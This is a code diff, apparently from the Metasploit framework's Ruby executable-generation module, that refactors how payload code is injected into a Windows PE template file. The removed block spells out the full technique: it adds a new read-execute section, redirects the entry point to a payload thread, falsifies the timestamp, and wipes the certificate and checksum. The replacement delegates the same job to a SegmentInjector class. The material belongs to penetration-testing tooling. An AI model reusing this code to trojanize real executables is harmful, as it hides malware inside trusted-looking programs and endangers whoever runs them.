@@ -16,6 +16,7 @@ require 'rex/pescan'
 require 'rex/zip'
 require 'metasm'
 require 'digest/sha1'
+require 'msf/core/exe/segment_injector'
 
 	##
 	#
@@ -175,80 +176,12 @@ require 'digest/sha1'
 
 		#try to inject code into executable by adding a section without affecting executable behavior
 		if(opts[:inject])
-			if endjunk
-				raise RuntimeError, "Junk at end of file. Is this a packed exe?"
-			end
-
-			#find first section file offset and free RVA for new section
-			free_rva = pe.hdr.opt.AddressOfEntryPoint
-			first_off = sections_end
-			pe.sections.each do |sec|
-				first_off = sec.file_offset if sec.file_offset < first_off
-				free_rva = sec.raw_size + sec.vma if sec.raw_size + sec.vma > free_rva
-			end
-			#align free_rva
-			free_rva += (pe.hdr.opt.SectionAlignment-(free_rva % pe.hdr.opt.SectionAlignment)) % pe.hdr.opt.SectionAlignment
-
-			#See if we can add a section
-			first_sechead_file_off = pe.hdr.dos.e_lfanew + Rex::PeParsey::PeBase::IMAGE_FILE_HEADER_SIZE + pe.hdr.file.SizeOfOptionalHeader
-			new_sechead_file_off = first_sechead_file_off + pe.hdr.file.NumberOfSections * Rex::PeParsey::PeBase::IMAGE_SIZEOF_SECTION_HEADER
-			if new_sechead_file_off + Rex::PeParsey::PeBase::IMAGE_SIZEOF_SECTION_HEADER > first_off
-				raise RuntimeError, "Not enough room for new section header"
-			end
-
-			# figure out where in the new section to put the start. Right now just putting at the beginning of the new section
-			start_rva = free_rva
-
-			#make new section, starting at free RVA
-			new_sec = win32_rwx_exec_thread(code, pe.hdr.opt.AddressOfEntryPoint - start_rva)
-			#pad to file alignment
-			new_sec += "\x00" * (pe.hdr.opt.SectionAlignment-(new_sec.length % pe.hdr.opt.SectionAlignment))
-
-			#make new section header
-			new_sechead = Rex::PeParsey::PeBase::IMAGE_SECTION_HEADER.make_struct
-			new_sechead.v['Name'] = Rex::Text.rand_text_alpha(4)+"\x00"*4 # no name
-			new_sechead.v['Characteristics'] = 0x60000020 # READ, EXECUTE, CODE
-			new_sechead.v['VirtualAddress'] = free_rva
-			new_sechead.v['SizeOfRawData'] = new_sec.length
-			new_sechead.v['PointerToRawData'] = sections_end
-
-			# Create the modified version of the input executable
-			exe = ''
-			File.open(opts[:template], 'rb') { |fd|
-				exe = fd.read(fd.stat.size)
-			}
-
-			#New file header with updated number of sections and timedatestamp
-			new_filehead = Rex::PeParsey::PeBase::IMAGE_FILE_HEADER.make_struct
-			new_filehead.from_s(exe[pe.hdr.dos.e_lfanew, Rex::PeParsey::PeBase::IMAGE_FILE_HEADER_SIZE])
-			new_filehead.v['NumberOfSections'] = pe.hdr.file.NumberOfSections + 1
-			new_filehead.v['TimeDateStamp'] = pe.hdr.file.TimeDateStamp - rand(0x1000000)
-			exe[pe.hdr.dos.e_lfanew, new_filehead.to_s.length] = new_filehead.to_s
-
-			#new optional header with new entry point, size of image, and size of code
-			new_opthead = Rex::PeParsey::PeBase::IMAGE_OPTIONAL_HEADER32.make_struct
-			new_opthead.from_s(exe[pe.hdr.dos.e_lfanew + Rex::PeParsey::PeBase::IMAGE_FILE_HEADER_SIZE, pe.hdr.file.SizeOfOptionalHeader])
-			new_opthead.v['AddressOfEntryPoint'] = start_rva
-			new_opthead.v['SizeOfImage'] = free_rva + new_sec.length
-			new_opthead.v['SizeOfCode'] = pe.hdr.opt.SizeOfCode + new_sec.length
-			exe[pe.hdr.dos.e_lfanew + Rex::PeParsey::PeBase::IMAGE_FILE_HEADER_SIZE, pe.hdr.file.SizeOfOptionalHeader] = new_opthead.to_s
-			#kill bound import table; if it exists, we probably overwrote it with our new section and they dont even need it anyway
-			exe[pe.hdr.dos.e_lfanew + Rex::PeParsey::PeBase::IMAGE_FILE_HEADER_SIZE + 184, 8] = "\x00"*8
-			#kill certificate; if it exists, we just invalidated it
-			exe[pe.hdr.dos.e_lfanew + Rex::PeParsey::PeBase::IMAGE_FILE_HEADER_SIZE + 128, 8] = "\x00"*8
-
-			#new section header and new section
-			exe[new_sechead_file_off, new_sechead.to_s.length] = new_sechead.to_s
-			exe[new_sechead.v['PointerToRawData'], new_sec.length] = new_sec
-			exe.slice!((new_sechead.v['PointerToRawData'] + new_sec.length)..-1)
-
-			cks = pe.hdr.opt.CheckSum
-			if(cks != 0)
-				exe[ exe.index([ cks ].pack('V')), 4] = [0].pack("V")
-			end
-
-			pe.close
-
+      injector = Msf::Exe::SegmentInjector.new({
+          :payload  => code,
+          :template => opts[:template],
+          :arch     => :x86
+      })
+      exe = injector.generate_pe
 			return exe
 		end
 
